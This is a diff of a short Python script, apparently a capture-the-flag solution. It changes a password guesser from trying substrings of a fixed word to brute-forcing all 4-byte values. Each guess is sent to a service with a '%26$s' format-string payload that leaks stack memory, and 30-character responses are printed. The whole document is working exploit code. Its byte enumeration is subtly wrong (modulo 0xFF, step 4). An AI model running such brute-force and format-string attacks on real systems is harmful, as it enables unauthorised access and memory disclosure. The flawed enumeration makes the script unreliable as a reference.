@@ -1,18 +1,19 @@
 #! /usr/bin/python3
+import tqdm
+
 import connect
 
 
 def main():
-    len_pass = 4
-    super_str = b"thiswordakedstactest"
-    len_super = len(super_str)
     # Note the value at 26$ and 27$ won't be accessible, but that's ok as that should be the input buffer itself
-    for i in range(0, len_super - len_pass + 1):
-        guess = super_str[i: i + len_pass]
-        print(guess)
-        out = connect.connect(password=guess + b"%26$s")
-        if len(out):
-            print(guess, len(out), out)
+    for i in tqdm.trange(0, 0xFFFFFFFF + 1, 4):
+        guess = bytes((i % 0xFF, (i // 0x100) % 0xFF, (i // 0x10000) % 0xFF, (i // 0x1000000) % 0xFF))
+        try:
+            out = connect.connect(password=guess + b"%26$s")
+        except ConnectionResetError:
+            continue
+        if len(out.strip()) == 30:
+            tqdm.tqdm.write(' '.join((str(guess), str(len(out)), str(out),)))
 
 
 if __name__ == '__main__':
